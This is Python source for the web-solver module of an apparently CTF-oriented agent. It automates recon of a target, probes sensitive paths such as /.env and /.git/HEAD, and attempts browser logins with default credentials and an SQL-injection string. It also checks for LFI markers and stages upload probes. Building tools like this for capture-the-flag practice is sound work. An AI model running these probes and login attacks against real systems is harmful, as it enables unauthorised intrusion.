import json
import re
import uuid
from pathlib import Path
from urllib.parse import parse_qsl, urljoin, urlparse

from ctf_agent.core.board import build_triage_board
from ctf_agent.core.memory import StateMemory
from ctf_agent.core.models import ChallengeState
from ctf_agent.solvers.base import BaseSolver


class WebSolver(BaseSolver):
    COMMON_PATHS = [
        "/",
        "/robots.txt",
        "/sitemap.xml",
        "/.git/HEAD",
        "/.env",
        "/admin",
        "/admin/login",
        "/admin.php",
        "/login",
        "/signin",
        "/register",
        "/dashboard",
        "/profile",
        "/upload",
        "/uploads",
        "/files",
        "/api",
        "/api-docs",
        "/swagger",
        "/openapi.json",
        "/graphql",
    ]
    TEXT_ATTACHMENT_SUFFIXES = {
        ".txt",
        ".md",
        ".json",
        ".yaml",
        ".yml",
        ".xml",
        ".html",
        ".htm",
        ".js",
        ".php",
        ".py",
        ".java",
        ".log",
        ".csv",
    }
    IMAGE_ATTACHMENT_SUFFIXES = {".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp"}
    USERNAME_KEYS = {"username", "user", "email", "login", "account", "name"}
    PASSWORD_KEYS = {"password", "pass", "passwd", "pwd"}
    UPLOAD_HINTS = {"upload", "avatar", "image", "file", "import"}
    SSRF_PARAM_NAMES = {"url", "target", "next", "redirect", "callback", "avatar", "image", "dest"}
    COMMON_PARAM_NAMES = [
        "id",
        "uid",
        "file",
        "path",
        "page",
        "url",
        "next",
        "redirect",
        "callback",
        "search",
        "q",
        "debug",
        "token",
        "lang",
        "filename",
        "name",
    ]
    SQL_ERROR_HINTS = [
        "sql syntax",
        "mysql",
        "sqlite",
        "postgresql",
        "unclosed quotation mark",
        "syntax error",
        "odbc",
        "ora-",
        "sqlstate",
        "pdoexception",
    ]
    LFI_MARKERS = [
        "root:x:0:0:",
        "[extensions]",
        "[fonts]",
        "[mci extensions]",
        "for 16-bit app support",
    ]
    SUCCESS_HINTS = ["logout", "dashboard", "welcome", "profile", "admin", "jwt", "token"]
    FAILURE_HINTS = ["invalid", "incorrect", "failed", "error", "retry", "denied", "wrong"]
    LOGIN_TESTS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("guest", "guest"),
        ("test", "test"),
        ("admin' or '1'='1", "admin' or '1'='1"),
    ]
    JS_ROUTE_PATTERNS = [
        re.compile(r"['\"](/(?:api|auth|admin|graphql|v[0-9]|user)[^'\" ]*)['\"]"),
        re.compile(r"(?:fetch|axios\.(?:get|post|put|delete|request)|open)\s*\(?\s*['\"](/[^'\" ]+)['\"]"),
        re.compile(r"['\"](/[^'\" ]{2,180})['\"]"),
    ]
    JS_PARAM_PATTERNS = [
        re.compile(r"['\"]([A-Za-z_][A-Za-z0-9_-]{1,40})['\"]\s*:"),
        re.compile(r"[?&]([A-Za-z_][A-Za-z0-9_-]{1,40})="),
    ]
    KEYWORD_PATTERN = re.compile(r"(token|jwt|secret|password|flag|debug|upload|login|admin|redirect|callback)", re.IGNORECASE)
    PATH_PATTERN = re.compile(r"/[A-Za-z0-9._~!$&'()*+,;=:@%/\\-]{2,180}")
    PARAM_PATTERN = re.compile(r"[?&]([A-Za-z_][A-Za-z0-9_-]{1,40})=")
    URL_PATTERN = re.compile(r"https?://[^\s'\"<>]{4,260}")
    UPLOAD_PATH_CANDIDATES = [
        "/uploads/{filename}",
        "/upload/{filename}",
        "/files/{filename}",
        "/static/uploads/{filename}",
        "/static/{filename}",
        "/images/{filename}",
    ]

    def __init__(
        self,
        http_tool,
        file_tool,
        shell_tool,
        oob_tool,
        verifier,
        toolkit_tool=None,
        remote_tool=None,
        profile=None,
        mcp_registry=None,
        auto_run_sqlmap=False,
        max_js_assets=5,
        web_policy=None,
    ):
        self.http_tool = http_tool
        self.file_tool = file_tool
        self.shell_tool = shell_tool
        self.oob_tool = oob_tool
        self.verifier = verifier
        self.toolkit_tool = toolkit_tool
        self.remote_tool = remote_tool
        self.profile = profile or {}
        self.mcp_registry = mcp_registry
        self.auto_run_sqlmap = auto_run_sqlmap
        self.max_js_assets = max_js_assets
        self.web_policy = dict(web_policy or {})

    def solve(self, challenge, workspace):
        workspace = Path(workspace)
        state = ChallengeState(phase="collect")
        memory = StateMemory(state)
        solver_meta = self._resolve_solver_metadata(challenge)
        autopilot = dict(solver_meta.get("autopilot") or {})
        context = {
            "candidate_paths": set(),
            "candidate_params": set(self.COMMON_PARAM_NAMES),
            "forms": [],
            "js_routes": [],
            "browser_reports": [],
            "login_attempts": [],
            "upload_attempts": [],
            "probe_results": [],
            "sqli_checks": [],
            "oob_checks": [],
            "mcp_digest": [],
            "best_plan_attempts": [],
            "executed_plan_keys": set(),
            "used_browser_mcp": False,
            "browser_state": {
                "requested": challenge.metadata.get("use_browser_mcp", self.web_policy.get("auto_use_browser_mcp", True)) is not False,
                "enabled": False,
                "used": False,
                "server": "",
                "tool": "",
                "fallback_reason": "",
                "auth_state": "unknown",
                "auth_evidence": [],
                "route_candidates": [],
                "param_candidates": [],
                "upload_candidates": [],
                "executable_candidates": [],
                "login_forms": 0,
                "upload_forms": 0,
            },
            "sqli_targets": [],
            "remote_reports": [],
            "remote_host": challenge.metadata.get("use_remote_host", ""),
            "remote_selection_mode": "",
            "remote_selection_reason": "",
            "remote_selection_candidates": [],
            "remote_workspace": {},
            "oob_callback": self.oob_tool.generate_callback() if self.oob_tool.is_enabled() else None,
            "autopilot": autopilot,
            "knowledge": dict(solver_meta.get("knowledge") or {}),
        }
        return self._run_pipeline(challenge, workspace, state, memory, context, start_from="collect")

    def continue_solve(self, challenge, workspace):
        session, state, saved = self._restore_solver_resume_context(workspace)
        if not session:
            return self.solve(challenge, workspace)
        memory = StateMemory(state)
        context = dict(saved.get("context") or {})
        checkpoint = str(session.get("checkpoint", "") or "")
        start_from = "collect"
        if checkpoint.startswith("browser_flow:"):
            start_from = "browser"
        elif checkpoint.startswith("remote_recon"):
            start_from = "recon"
        elif checkpoint.startswith("sqlmap:"):
            start_from = "sqli"
        return self._run_pipeline(challenge, Path(workspace), state, memory, context, start_from=start_from)

    def _run_pipeline(self, challenge, workspace, state, memory, context, start_from="collect"):
        if state.phase == "needs_approval":
            state.phase = start_from
            state.blocked_reason = None
        context["candidate_paths"] = set(context.get("candidate_paths", []) or [])
        context["candidate_params"] = set(context.get("candidate_params", []) or [])
        context["executed_plan_keys"] = set(context.get("executed_plan_keys", []) or [])
        max_rounds = int(challenge.metadata.get("max_rounds", self.web_policy.get("max_rounds", 6)))
        stages = ["collect", "recon", "browser", "login", "upload", "probe", "sqli", "oob"]
        start_index = stages.index(start_from) if start_from in stages else 0
        for index, stage_name in enumerate(stages):
            if index < start_index:
                continue
            if stage_name == "collect":
                self._collect(challenge, workspace, memory, context)
            elif stage_name == "recon":
                self._recon_target(challenge, workspace, memory, context)
            elif stage_name == "browser":
                self._browser_recon_flow(challenge, workspace, memory, context, "initial")
            elif stage_name == "login":
                self._analyze_login_forms(challenge, memory, context)
            elif stage_name == "upload":
                self._analyze_upload_points(challenge, memory, context)
            elif stage_name == "probe":
                self._probe_candidates(challenge, memory, context)
            elif stage_name == "sqli":
                self._run_sqli_automation(challenge, memory, context)
            elif stage_name == "oob":
                self._run_oob_checks(challenge, memory, context)
            if state.phase == "needs_approval":
                self._write_context_artifacts(workspace, context)
                self._write_notes(challenge, workspace, state)
                self._write_solution_stub(challenge, workspace, state)
                self._write_board(challenge, workspace, state, context)
                return state

        for _ in range(max_rounds):
            if self._cancel_requested(challenge):
                state.blocked_reason = "run canceled"
                break
            if self.verifier.choose_best(state, challenge):
                break
            best_plan = self._choose_best_plan(state, context["executed_plan_keys"])
            if not best_plan:
                break
            context["executed_plan_keys"].add(self._plan_key(best_plan))
            self._attempt_exploit_plan(best_plan, challenge, memory, context)
            if state.phase == "needs_approval":
                self._write_context_artifacts(workspace, context)
                self._write_notes(challenge, workspace, state)
                self._write_solution_stub(challenge, workspace, state)
                self._write_board(challenge, workspace, state, context)
                return state
            if not self.verifier.choose_best(state, challenge):
                self._run_oob_checks(challenge, memory, context)
                if state.phase == "needs_approval":
                    self._write_context_artifacts(workspace, context)
                    self._write_notes(challenge, workspace, state)
                    self._write_solution_stub(challenge, workspace, state)
                    self._write_board(challenge, workspace, state, context)
                    return state
                if not context["used_browser_mcp"]:
                    self._browser_recon_flow(challenge, workspace, memory, context, "post-exploit")
                    if state.phase == "needs_approval":
                        self._write_context_artifacts(workspace, context)
                        self._write_notes(challenge, workspace, state)
                        self._write_solution_stub(challenge, workspace, state)
                        self._write_board(challenge, workspace, state, context)
                        return state

        state.phase = "report"
        self._write_context_artifacts(workspace, context)
        self._write_notes(challenge, workspace, state)
        self._write_solution_stub(challenge, workspace, state)
        self._write_board(challenge, workspace, state, context)
        self._clear_solver_session(workspace)
        return state

    def _solver_context_snapshot(self, context, **extra):
        def _normalize(value):
            if isinstance(value, set):
                return sorted([_normalize(item) for item in value])
            if isinstance(value, list):
                return [_normalize(item) for item in value]
            if isinstance(value, tuple):
                return [_normalize(item) for item in value]
            if isinstance(value, dict):
                return {str(key): _normalize(item) for key, item in value.items()}
            return value

        payload = {"context": _normalize(dict(context or {}))}
        for key, value in dict(extra or {}).items():
            payload[key] = _normalize(value)
        return payload

    def _cancel_requested(self, challenge):
        cancel_event = challenge.metadata.get("cancel_event")
        return bool(cancel_event and cancel_event.is_set())

    def _collect(self, challenge, workspace, memory, context):
        if self.profile.get("goal"):
            memory.add_hypothesis(self.profile["goal"])
        autopilot = dict(context.get("autopilot") or {})
        knowledge = dict(context.get("knowledge") or {})
        if autopilot.get("summary"):
            memory.add_finding("autopilot", "自动编排计划已生成", autopilot["summary"], 0.74)
        for hint in list(autopilot.get("solver_hints", []))[:4]:
            memory.add_hypothesis(hint)
        if knowledge.get("pack_name"):
            memory.add_finding("knowledge", "Embedded playbook selected", knowledge.get("pack_name", ""), 0.72)
        for item in list(knowledge.get("top_tactics", []))[:3]:
            memory.add_hypothesis(item)

        if self.toolkit_tool and self.toolkit_tool.is_configured():
            tools = self.toolkit_tool.available_tools()
            if tools:
                memory.add_finding("toolkit", "本地工具箱已接入", ", ".join(tools), 0.92)

        if self.mcp_registry and self.mcp_registry.has_servers():
            digest = self.mcp_registry.tool_digest()
            context["mcp_digest"] = digest
            parts = []
            for item in digest:
                if item.get("error"):
                    details = item["error"]["message"] if isinstance(item["error"], dict) else str(item["error"])
                    parts.append("{0}: {1}".format(item["server"], details))
                else:
                    parts.append("{0}: {1} tools".format(item["server"], item["tool_count"]))
            memory.add_finding("mcp", "检测到可用 MCP 配置", " | ".join(parts), 0.72)

        self._prepare_remote_helper(challenge, workspace, memory, context)

        for attachment in challenge.attachments:
            suffix = attachment.suffix.lower()
            if suffix in self.TEXT_ATTACHMENT_SUFFIXES:
                text = self.file_tool.read_text(attachment, limit_bytes=250000)
                memory.record_action("collect", "scan attachment {0}".format(attachment.name), "ok", "扫描文本附件", str(attachment))
                self._inspect_text_blob(text, "attachment:{0}".format(attachment.name), memory)
                continue
            if self.toolkit_tool and self.toolkit_tool.has_tool("strings"):
                result = self.toolkit_tool.run_named_tool("strings", [str(attachment)], timeout=90)
                artifact = workspace / "artifacts" / "{0}_strings.txt".format(self._safe_name(attachment.stem))
                self.file_tool.write_text(artifact, result.get("stdout", "") + ("\n" + result.get("stderr", "") if result.get("stderr") else ""))
                memory.record_action("collect", "strings {0}".format(attachment.name), str(result.get("status", "unknown")), "提取二进制字符串", str(artifact))
                self._inspect_text_blob(result.get("stdout", ""), "strings:{0}".format(attachment.name), memory)
            if suffix in self.IMAGE_ATTACHMENT_SUFFIXES and self.toolkit_tool and self.toolkit_tool.has_tool("exiftool"):
                result = self.toolkit_tool.run_named_tool("exiftool", [str(attachment)], timeout=90)
                artifact = workspace / "artifacts" / "{0}_exif.txt".format(self._safe_name(attachment.stem))
                self.file_tool.write_text(artifact, result.get("stdout", "") + ("\n" + result.get("stderr", "") if result.get("stderr") else ""))
                memory.record_action("collect", "exiftool {0}".format(attachment.name), str(result.get("status", "unknown")), "扫描图片元数据", str(artifact))
                self._inspect_text_blob(result.get("stdout", ""), "exif:{0}".format(attachment.name), memory)

        memory.add_hypothesis("先围绕入口、表单、JS 路由、上传点和敏感参数做侦察，再推进到可复现 exploit。")

    def _recon_target(self, challenge, workspace, memory, context):
        if not challenge.target:
            memory.record_action("recon", "target recon", "skipped", "题目没有在线目标")
            return

        base_url = self.http_tool.normalize_target(challenge.target)
        challenge.target = base_url
        root_response = self.http_tool.request("GET", base_url)
        root_artifact = self._save_http_artifact(workspace, "root", root_response)
        memory.record_action("recon", "GET {0}".format(base_url), self._status_text(root_response), "抓取首页响应", root_artifact)
        remote_response = self._remote_recon_target(challenge, workspace, memory, context, base_url, root_response)
        if root_response["error"]:
            if remote_response and not remote_response.get("error"):
                memory.add_finding("remote", "远程辅助视角可访问目标", "{0} -> {1}".format(context.get("remote_host", ""), remote_response.get("url", base_url)), 0.67)
            memory.add_finding("root", "首页请求失败", root_response["error"], 0.96)
            return

        self._process_response_flags(root_response["text"], "root", memory, reproducible=True)
        summary = self.http_tool.summarize_html(root_response["text"], base_url)
        context["forms"] = summary.get("forms", [])

        for form in context["forms"]:
            parsed = urlparse(form.get("action") or "")
            context["candidate_paths"].add(parsed.path or "/")
            for item in form.get("inputs", []):
                if item.get("name"):
                    context["candidate_params"].add(item["name"])

        for item in summary.get("links", []):
            parsed = urlparse(item)
            if not parsed.netloc or parsed.netloc == urlparse(base_url).netloc:
                if parsed.path:
                    context["candidate_paths"].add(parsed.path)
                for key in self._extract_query_keys(item):
                    context["candidate_params"].add(key)

        for path in self._extract_paths_from_text(root_response["text"]):
            context["candidate_paths"].add(path)

        frameworks = self._infer_frameworks(root_response["text"], root_response["headers"])
        for framework in frameworks:
            memory.add_finding("fingerprint", "疑似框架指纹", framework, 0.6)
        if summary.get("title"):
            memory.add_finding("html", "页面标题", summary["title"], 0.66)

        for index, script_url in enumerate(summary.get("scripts", [])[: self.max_js_assets]):
            if self._cancel_requested(challenge):
                return
            script_response = self.http_tool.request("GET", script_url)
            artifact = self._save_http_artifact(workspace, "script_{0}".format(index + 1), script_response)
            memory.record_action("recon", "GET {0}".format(script_url), self._status_text(script_response), "抓取 JavaScript 资源", artifact)
            if script_response["error"]:
                continue
            routes, params, keywords = self._scan_js(script_response["text"])
            context["js_routes"].append({"url": script_url, "routes": routes, "params": params, "keywords": keywords})
            for route in routes:
                context["candidate_paths"].add(route)
            for param in params:
                context["candidate_params"].add(param)
            for keyword in keywords[:8]:
                memory.add_finding("js", "JavaScript 线索", keyword, 0.45)

        for item in self.http_tool.discover_common_paths(base_url, self.COMMON_PATHS):
            response = item["response"]
            if response["status"] in (200, 401, 403):
                context["candidate_paths"].add(item["path"])
                memory.record_action("recon", "GET {0}".format(item["url"]), str(response["status"]), "命中常见敏感路径")
                self._process_response_flags(response["text"], "path:{0}".format(item["path"]), memory, reproducible=True)

        for hypothesis in self._derive_hypotheses(summary, frameworks, context["candidate_paths"]):
            memory.add_hypothesis(hypothesis)

    def _prepare_remote_helper(self, challenge, workspace, memory, context):
        if not self.remote_tool:
            return

        decision = dict(challenge.metadata.get("remote_selection") or {})
        if not decision:
            decision = self.remote_tool.recommend_host(
                category="web",
                target=challenge.target or "",
                preferred=context.get("remote_host") or challenge.metadata.get("use_remote_host"),
            )
        context["remote_selection_mode"] = decision.get("selection_mode", "")
        context["remote_selection_reason"] = decision.get("reason", "")
        context["remote_selection_candidates"] = list(decision.get("candidates", []))

        requested_host = decision.get("selected_host", "")
        context["remote_host"] = requested_host
        if not requested_host:
            if decision.get("selection_mode") == "explicit" and decision.get("requested_host"):
                memory.add_finding("remote", "指定远程主机未配置", decision.get("requested_host", ""), 0.4)
            elif decision.get("reason"):
                memory.add_finding("remote", "本轮未启用远程辅助", decision.get("reason", ""), 0.28)
            return

        if decision.get("selection_mode") == "automatic":
            memory.add_finding("remote", "自动选择远程辅助主机", "{0} | {1}".format(requested_host, decision.get("reason", "")), 0.58)
        else:
            memory.add_finding("remote", "使用指定远程辅助主机", requested_host, 0.52)

        probe = self.remote_tool.probe(requested_host, timeout=18)
        probe["kind"] = "probe"
        context["remote_reports"].append(probe)
        probe_artifact = workspace / "artifacts" / "remote_{0}_probe.json".format(self._safe_name(requested_host))
        self.file_tool.write_json(probe_artifact, probe)
        memory.record_action("remote", "probe {0}".format(requested_host), probe.get("status", "error"), "探测远程辅助主机", str(probe_artifact))
        if probe.get("status") != "ok":
            memory.add_finding("remote", "远程辅助主机连接失败", "{0}: {1}".format(requested_host, probe.get("message", "unknown error")), 0.42)
            return

        memory.add_finding(
            "remote",
            "远程辅助主机可达",
            "{0}@{1}".format(probe.get("username") or "user", probe.get("hostname") or requested_host),
            0.7,
        )
        remote_workspace = self.remote_tool.ensure_workspace(
            requested_host,
            run_id=challenge.metadata.get("run_id") or workspace.name,
            timeout=20,
        )
        remote_workspace["kind"] = "workspace"
        context["remote_workspace"] = remote_workspace if remote_workspace.get("status") == "ok" else {}
        context["remote_reports"].append(remote_workspace)
        workspace_artifact = workspace / "artifacts" / "remote_{0}_workspace.json".format(self._safe_name(requested_host))
        self.file_tool.write_json(workspace_artifact, remote_workspace)
        memory.record_action(
            "remote",
            "ensure workspace on {0}".format(requested_host),
            remote_workspace.get("status", "error"),
            "初始化远程辅助工作目录",
            str(workspace_artifact),
        )

    def _remote_recon_target(self, challenge, workspace, memory, context, base_url, local_response):
        host_name = context.get("remote_host")
        if not host_name or not self.remote_tool:
            return None

        remote_workspace = context.get("remote_workspace", {})
        script = (
            "import json, re, sys, time, urllib.request\n"
            "url = sys.argv[1]\n"
            "payload = {'status': 'error', 'url': url}\n"
            "started = time.monotonic()\n"
            "try:\n"
            "    request = urllib.request.Request(url, headers={'User-Agent': 'ctf-agent-remote/1.0'})\n"
            "    with urllib.request.urlopen(request, timeout=12) as response:\n"
            "        body = response.read(200000)\n"
            "        elapsed = time.monotonic() - started\n"
            "        text = body.decode('utf-8', errors='replace')\n"
            "        match = re.search(r'<title[^>]*>(.*?)</title>', text, re.I | re.S)\n"
            "        title = re.sub(r'\\s+', ' ', match.group(1)).strip()[:200] if match else ''\n"
            "        payload = {\n"
            "            'status': 'ok',\n"
            "            'url': response.geturl(),\n"
            "            'status_code': getattr(response, 'status', None) or response.getcode(),\n"
            "            'headers': dict(response.headers.items()),\n"
            "            'content_type': response.headers.get('Content-Type', '').lower(),\n"
            "            'elapsed': round(float(elapsed), 4),\n"
            "            'length': len(text),\n"
            "            'title': title,\n"
            "            'text': text[:12000],\n"
            "        }\n"
            "except Exception as exc:\n"
            "    payload['error'] = str(exc)\n"
            "print(json.dumps(payload, ensure_ascii=False))\n"
        )
        result = self.remote_tool.run_python(
            host_name,
            script,
            args=[base_url],
            timeout=45,
            cwd=remote_workspace.get("workspace_root"),
        )
        payload = {}
        stdout_text = (result.get("stdout", "") or "").strip()
        if stdout_text:
            try:
                payload = json.loads(stdout_text)
            except Exception:
                payload = {"status": "error", "error": "invalid remote JSON", "raw_stdout": stdout_text[:12000]}
        elif result.get("status") != "ok":
            payload = {"status": "error", "error": result.get("stderr") or result.get("message", "remote python failed")}

        report = {
            "kind": "http-fetch",
            "host": host_name,
            "status": payload.get("status", result.get("status", "error")),
            "python_bin": result.get("python_bin", ""),
            "returncode": result.get("returncode"),
            "stderr": (result.get("stderr", "") or "")[:6000],
            "payload": payload,
        }
        remote_response = self._remote_payload_to_response(payload)
        if remote_response:
            report["comparison_to_local"] = self.http_tool.compare_responses(
                local_response,
                remote_response,
                markers=self.SUCCESS_HINTS + self.FAILURE_HINTS + ["flag{"],
            )
        artifact = workspace / "artifacts" / "remote_{0}_http.json".format(self._safe_name(host_name))
        self.file_tool.write_json(artifact, report)
        context["remote_reports"].append(report)
        memory.record_action(
            "remote",
            "fetch {0} from {1}".format(base_url, host_name),
            report.get("status", "error"),
            "使用远程辅助主机复测目标响应",
            str(artifact),
        )
        if report.get("status") != "ok":
            memory.add_finding(
                "remote",
                "远程辅助主机未能复测目标",
                "{0}: {1}".format(host_name, payload.get("error") or result.get("stderr") or "unknown error"),
                0.4,
            )
            return None

        self._process_response_flags(remote_response.get("text", ""), "remote:{0}".format(host_name), memory, reproducible=True)
        memory.add_finding(
            "remote",
            "远程辅助主机已复测目标",
            "{0} -> {1} ({2})".format(host_name, remote_response.get("url", base_url), remote_response.get("status")),
            0.58,
        )
        comparison = report.get("comparison_to_local", {})
        if comparison.get("score", 0.0) >= 0.35:
            memory.add_finding(
                "remote",
                "本地与远程视角响应存在差异",
                ", ".join(comparison.get("reasons", [])) or "response changed across vantage points",
                0.66,
            )
        return remote_response

    def _remote_payload_to_response(self, payload):
        if not payload or payload.get("status") != "ok":
            return None
        headers = dict(payload.get("headers", {}))
        return {
            "url": payload.get("url", ""),
            "status": payload.get("status_code"),
            "headers": headers,
            "body": (payload.get("text", "") or "").encode("utf-8", errors="replace"),
            "text": payload.get("text", "") or "",
            "content_type": payload.get("content_type", headers.get("Content-Type", "").lower()),
            "error": None,
            "cookies": [],
            "elapsed": float(payload.get("elapsed", 0.0) or 0.0),
        }

    def _browser_assist_recon(self, challenge, workspace, memory, context, reason):
        if not challenge.target or not self.mcp_registry or not self.mcp_registry.has_servers():
            return
        if challenge.metadata.get("use_browser_mcp", self.web_policy.get("auto_use_browser_mcp", True)) is False:
            return

        payload = self.mcp_registry.call_browser_task_safe(
            "Open the target and summarize forms, routes, hidden parameters, CSRF tokens, upload flows, login transitions, and interesting DOM/API behavior.",
            challenge.target,
            timeout=60.0,
        )
        if self._maybe_pause_on_approval(
            challenge,
            workspace,
            memory,
            checkpoint="browser_task:{0}".format(reason),
            result=payload,
            context=self._solver_context_snapshot(context, reason=reason),
            pending_action={"kind": "browser_task", "reason": reason, "url": challenge.target},
            blocked_reason=str(payload.get("message", "") or "browser MCP approval required"),
        ):
            return
        if payload.get("status") == "error":
            memory.add_finding("mcp", "浏览器 MCP 调用失败", payload.get("summary", "") or payload.get("message", ""), 0.36)
            return
        text = self.mcp_registry.flatten_tool_result(payload.get("result"))

        context["used_browser_mcp"] = True
        artifact = workspace / "artifacts" / "browser_mcp_{0}.txt".format(reason)
        self.file_tool.write_text(artifact, text)
        context["browser_reports"].append({"reason": reason, "server": payload["server"], "tool": payload["tool"], "artifact": str(artifact)})
        memory.record_action("browser", "{0}:{1}".format(payload["server"], payload["tool"]), "ok", "浏览器 MCP 完成页面辅助侦察", str(artifact))

        for path in self._extract_paths_from_text(text):
            context["candidate_paths"].add(path)
        for url in self.URL_PATTERN.findall(text):
            parsed = urlparse(url)
            if parsed.netloc == urlparse(challenge.target).netloc and parsed.path:
                context["candidate_paths"].add(parsed.path)
            for key in self._extract_query_keys(url):
                context["candidate_params"].add(key)
        for key in self.PARAM_PATTERN.findall(text):
            context["candidate_params"].add(key)

        lowered = text.lower()
        if "csrf" in lowered or "token" in lowered:
            memory.add_finding("browser", "浏览器输出中出现 token/CSRF 线索", "see browser_mcp artifact", 0.56)
        if "upload" in lowered:
            memory.add_hypothesis("浏览器辅助结果显示可能存在上传流，优先验证是否可控与可执行。")

    def _browser_recon_flow(self, challenge, workspace, memory, context, reason, action="recon", **kwargs):
        browser_state = context.setdefault("browser_state", {})
        if not challenge.target:
            browser_state["fallback_reason"] = "target missing"
            return {}
        if challenge.metadata.get("use_browser_mcp", self.web_policy.get("auto_use_browser_mcp", True)) is False:
            browser_state["fallback_reason"] = "browser MCP disabled by run settings"
            return {}
        if not self.mcp_registry or not self.mcp_registry.has_servers():
            browser_state["fallback_reason"] = "no MCP servers configured"
            return {}

        task = kwargs.pop(
            "task",
            "Open the target and summarize forms, routes, hidden parameters, CSRF tokens, upload flows, login transitions, and interesting DOM/API behavior.",
        )
        payload = self.mcp_registry.call_browser_flow_safe(
            challenge.target,
            action=action,
            task=task,
            timeout=90.0,
            **kwargs
        )
        if self._maybe_pause_on_approval(
            challenge,
            workspace,
            memory,
            checkpoint="browser_flow:{0}:{1}".format(action, reason),
            result=payload,
            context=self._solver_context_snapshot(context, reason=reason, action=action, extra_arguments=kwargs, task=task),
            pending_action={"kind": "browser_flow", "reason": reason, "action": action, "url": challenge.target, "task": task, "arguments": kwargs},
            blocked_reason=str(payload.get("message", "") or "browser MCP approval required"),
        ):
            return {}
        if payload.get("status") == "error":
            browser_state["enabled"] = False
            browser_state["fallback_reason"] = str(payload.get("summary", "") or payload.get("message", "browser MCP call failed"))
            memory.add_finding("mcp", "browser MCP call failed", browser_state["fallback_reason"], 0.36)
            return {}
        text = self.mcp_registry.flatten_tool_result(payload.get("result"))
        structured = dict(payload.get("structured") or {})

        browser_state["enabled"] = True
        browser_state["used"] = True
        browser_state["server"] = payload["server"]
        browser_state["tool"] = payload["tool"]
        browser_state["fallback_reason"] = ""
        context["used_browser_mcp"] = True

        text_artifact = workspace / "artifacts" / "browser_mcp_{0}_{1}.txt".format(action, reason)
        json_artifact = workspace / "artifacts" / "browser_mcp_{0}_{1}.json".format(action, reason)
        self.file_tool.write_text(text_artifact, text)
        self.file_tool.write_json(json_artifact, structured)
        context["browser_reports"].append(
            {
                "reason": reason,
                "action": action,
                "server": payload["server"],
                "tool": payload["tool"],
                "artifact": str(text_artifact),
                "json_artifact": str(json_artifact),
                "status": structured.get("status", "ok"),
                "summary": structured.get("summary", ""),
                "auth_state": structured.get("auth_state", ""),
                "upload_candidates": list(structured.get("upload_candidates", [])),
            }
        )
        memory.record_action("browser", "{0}:{1}".format(payload["server"], payload["tool"]), "ok", "browser MCP completed page-assisted analysis", str(json_artifact))
        self._ingest_browser_result(challenge, memory, context, structured)
        return structured

    def _ingest_browser_result(self, challenge, memory, context, structured):
        if not structured:
            return

        browser_state = context.setdefault("browser_state", {})
        routes = list(structured.get("route_candidates", []))
        params = list(structured.get("param_candidates", []))
        hidden_inputs = list(structured.get("hidden_inputs", []))
        upload_candidates = list(structured.get("upload_candidates", []))
        executable_candidates = list(structured.get("executable_candidates", []))

        for route in routes:
            parsed = urlparse(route)
            if parsed.netloc and parsed.netloc != urlparse(challenge.target).netloc:
                continue
            context["candidate_paths"].add(parsed.path or route)
        for form in list(structured.get("forms", [])):
            if form not in context["forms"]:
                context["forms"].append(form)
            parsed = urlparse(form.get("action", ""))
            if parsed.path:
                context["candidate_paths"].add(parsed.path)
            for field in form.get("inputs", []):
                if field.get("name"):
                    context["candidate_params"].add(field["name"])
        for item in params:
            context["candidate_params"].add(item)
        for item in hidden_inputs:
            if item.get("name"):
                context["candidate_params"].add(item["name"])

        browser_state["route_candidates"] = sorted(set(browser_state.get("route_candidates", [])) | set(routes))[:80]
        browser_state["param_candidates"] = sorted(set(browser_state.get("param_candidates", [])) | set(params))[:80]
        browser_state["upload_candidates"] = sorted(set(browser_state.get("upload_candidates", [])) | set(upload_candidates))[:40]
        browser_state["executable_candidates"] = sorted(set(browser_state.get("executable_candidates", [])) | set(executable_candidates))[:20]
        browser_state["login_forms"] = max(int(browser_state.get("login_forms", 0) or 0), int(structured.get("login_forms", 0) or 0))
        browser_state["upload_forms"] = max(int(browser_state.get("upload_forms", 0) or 0), int(structured.get("upload_forms", 0) or 0))

        auth_state = str(structured.get("auth_state", "") or "")
        auth_evidence = list(structured.get("auth_evidence", []))
        if auth_state and auth_state != "unknown":
            browser_state["auth_state"] = auth_state
        if auth_evidence:
            browser_state["auth_evidence"] = auth_evidence[:8]

        if hidden_inputs:
            names = ", ".join(sorted({item.get("name", "") for item in hidden_inputs if item.get("name")})[:6])
            memory.add_finding("browser", "browser found hidden fields / CSRF hints", names or "hidden fields observed", 0.62)
        if routes:
            memory.add_finding("browser", "browser found dynamic routes", ", ".join(routes[:6]), 0.58)
        if auth_state == "authenticated":
            auth_details = dict(structured.get("auth_details") or {})
            notes = "browser authenticated session; username={0}, url={1}, evidence={2}".format(
                auth_details.get("username", ""),
                structured.get("url", challenge.target),
                ", ".join(auth_evidence[:4]),
            )
            memory.add_finding("browser", "browser confirmed authenticated state", notes, 0.9)
            memory.add_exploit_plan("Browser Login Session", "GET", structured.get("url", challenge.target), data={"browser_action": "login"}, notes=notes, confidence=0.9)
            for path in ["/admin", "/dashboard", "/profile", "/flag", "/api/me"]:
                memory.add_exploit_plan("Browser Post-Login Follow-up", "GET", urljoin(challenge.target, path), notes="follow-up after browser-authenticated session", confidence=0.72)
        if upload_candidates:
            memory.add_finding("browser", "browser observed upload candidates", ", ".join(upload_candidates[:4]), 0.74)
        if executable_candidates:
            memory.add_finding("browser", "browser observed executable upload candidates", ", ".join(executable_candidates[:4]), 0.84)

    def _try_browser_login_flows(self, challenge, workspace, memory, context, form_index):
        browser_state = context.get("browser_state", {})
        if browser_state.get("auth_state") == "authenticated":
            return
        attempt_limit = int(self.web_policy.get("browser_login_attempt_limit", 3))
        for username, password in self.LOGIN_TESTS[:attempt_limit]:
            if self._cancel_requested(challenge):
                return
            result = self._browser_recon_flow(
                challenge,
                workspace,
                memory,
                context,
                reason="login_{0}_{1}".format(form_index, self._safe_name(username)),
                action="login",
                username=username,
                password=password,
                form_index=form_index,
                task="Submit the login form with the supplied credentials and summarize CSRF handling, redirects, cookies, and whether authentication succeeded.",
            )
            if result.get("auth_state") == "authenticated":
                return

    def _try_browser_upload_flows(self, challenge, workspace, memory, context, form_index):
        attempt_limit = int(self.web_policy.get("browser_upload_attempt_limit", 2))
        for probe in self._build_upload_probes()[:attempt_limit]:
            if self._cancel_requested(challenge):
                return
            result = self._browser_recon_flow(
                challenge,
                workspace,
                memory,
                context,
                reason="upload_{0}_{1}".format(form_index, self._safe_name(probe["filename"])),
                action="upload",
                file_name=probe["filename"],
                file_content=probe["content"],
                mime_type=probe["content_type"],
                form_index=form_index,
                task="Submit the upload form in a real browser and summarize CSRF handling, upload result, linked file paths, and executable candidates.",
            )
